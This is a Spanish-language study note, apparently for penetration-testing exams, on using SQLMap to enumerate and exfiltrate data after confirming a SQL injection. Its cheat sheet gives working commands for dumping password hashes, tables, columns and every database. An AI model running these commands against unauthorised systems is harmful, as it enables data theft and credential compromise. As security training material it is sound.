---
tags:
  - sqlmap
  - webapp
  - attack
---

## Conceptos Clave (TL;DR)

* La enumeración representa la parte central de un ataque de inyección SQL y se realiza inmediatamente después de confirmar que la vulnerabilidad es explotable.

* El proceso consiste en buscar y extraer (exfiltrar) toda la información disponible dentro de la base de datos vulnerable.

* Para lograr esto, las herramientas de automatización utilizan conjuntos de consultas predefinidas específicas para cada motor de base de datos (DBMS) con el fin de extraer el contenido.

* La exfiltración varía según el contexto: se usan consultas "inband" para inyecciones basadas en errores o consultas UNION (donde la respuesta se refleja en pantalla), y consultas "blind" para recuperar datos fila por fila y bit por bit cuando la inyección es ciega.

  
## Herramientas Clave

* **SQLMap**: Framework de explotación de inyecciones SQL que incluye consultas predefinidas para enumerar metadatos, tablas, columnas y volcar registros de múltiples DBMS.


## Metodología Paso a Paso

1. **Enumeración Básica de la Base de Datos**: Tras detectar la vulnerabilidad, el primer paso es obtener los metadatos del entorno para entender el contexto (versión del DBMS, usuario actual, base de datos en uso y privilegios de administrador).

2. **Enumeración de Tablas**: Una vez identificado el nombre de la base de datos objetivo, se procede a listar las tablas contenidas en ella para localizar aquellas que almacenen información sensible.

3. **Enumeración de Columnas y Extracción de Filas (Dump)**: Tras identificar una tabla de interés, se procede a extraer su contenido. Para optimizar el tiempo en tablas muy grandes, se recomienda filtrar por columnas específicas, limitar el número de filas o utilizar sentencias condicionales.

4. **Exfiltración Completa (Opcional)**: En caso de requerir un volcado masivo, se extrae el contenido de todas las tablas de una o todas las bases de datos, omitiendo preferiblemente las bases de datos propias del sistema operativo para agilizar el ataque.

  

## Cheat Sheet de Comandos

```bash
# ---------------------------
# Fase 1: Enumeracion Basica
# ---------------------------

# Extrae el banner (version del DBMS), usuario actual, base de datos en uso y verifica si el usuario tiene rol de DBA
sqlmap -u "<TARGET_URL_WITH_VULN_PARAM>" --banner --current-user --current-db --is-dba

  
# Extrae los hashes de contrasenas de la base de datos (si hay privilegios suficientes)
sqlmap -u "<TARGET_URL_WITH_VULN_PARAM>" --passwords
```
  
```bash
# ------------------------------
# Fase 2: Enumeracion de Tablas
# ------------------------------

# Lista todas las tablas dentro de una base de datos especifica
sqlmap -u "<TARGET_URL_WITH_VULN_PARAM>" --tables -D <DB_NAME>
```
  
```bash
# ---------------------------
# Fase 3: Exfiltracion de Datos (Dump)
# ------------------------------------

# Vuelca todo el contenido de una tabla especifica dentro de una base de datos
sqlmap -u "<TARGET_URL_WITH_VULN_PARAM>" --dump -T <TABLE_NAME> -D <DB_NAME>

  
# Vuelca solo columnas especificas dentro de una tabla (ideal para evitar ruido)
sqlmap -u "<TARGET_URL_WITH_VULN_PARAM>" --dump -T <TABLE_NAME> -D <DB_NAME> -C <COLUMN_1>,<COLUMN_2>

  
# Vuelca filas basandose en su numero ordinal utilizando un rango de inicio y fin
sqlmap -u "<TARGET_URL_WITH_VULN_PARAM>" --dump -T <TABLE_NAME> -D <DB_NAME> --start=<START_ROW_NUMBER> --stop=<STOP_ROW_NUMBER>

  
# Vuelca registros especificos utilizando una condicion WHERE
sqlmap -u "<TARGET_URL_WITH_VULN_PARAM>" --dump -T <TABLE_NAME> -D <DB_NAME> --where="<COLUMN_NAME> LIKE '<CONDITION>'"
```
  
```bash
# ----------------------------------------------------
# Fase 4: Exfiltracion Masiva y Formatos Alternativos
# ----------------------------------------------------

# Vuelca todas las tablas de una base de datos entera (omitiendo el flag -T)
sqlmap -u "<TARGET_URL_WITH_VULN_PARAM>" --dump -D <DB_NAME>

  
# Vuelca el contenido de TODAS las bases de datos, excluyendo las DBs del sistema
sqlmap -u "<TARGET_URL_WITH_VULN_PARAM>" --dump-all --exclude-sysdbs

  
# Cambia el formato de salida del volcado (por defecto es CSV) a HTML o SQLite
sqlmap -u "<TARGET_URL_WITH_VULN_PARAM>" --dump -T <TABLE_NAME> -D <DB_NAME> --dump-format=<HTML_OR_SQLITE>
```
  

## "Gotchas" y Troubleshooting

* **Falsas esperanzas con privilegios**: Que el usuario actual sea 'root' dentro del contexto de la base de datos o posea un rol 'DBA' generalmente no significa que equivalga al usuario 'root' del sistema operativo. Las capacidades a nivel de sistema operativo (como escritura de archivos en rutas arbitrarias) suelen estar fuertemente restringidas en despliegues modernos.

* **Ahorro de peticiones**: Si SQLMap ya ha identificado la inyección SQL en una ejecución anterior para ese objetivo, omitirá la fase de detección y saltará directamente a la enumeración aprovechando el caché de la sesión.

* **Formatos de salida**: Los resultados del volcado de tablas se guardan por defecto en formato CSV en el directorio local de la herramienta. Para investigar los datos extraídos posteriormente en un entorno local con comandos SQL, es muy útil utilizar `--dump-format=SQLite`.

* **Optimización de ataques masivos**: Cuando se utiliza `--dump-all` durante un examen o en un entorno grande, SIEMPRE se debe incluir el flag `--exclude-sysdbs` para evitar descargar bases de datos del sistema que consumen tiempo y rara vez contienen información de interés para el penetration tester.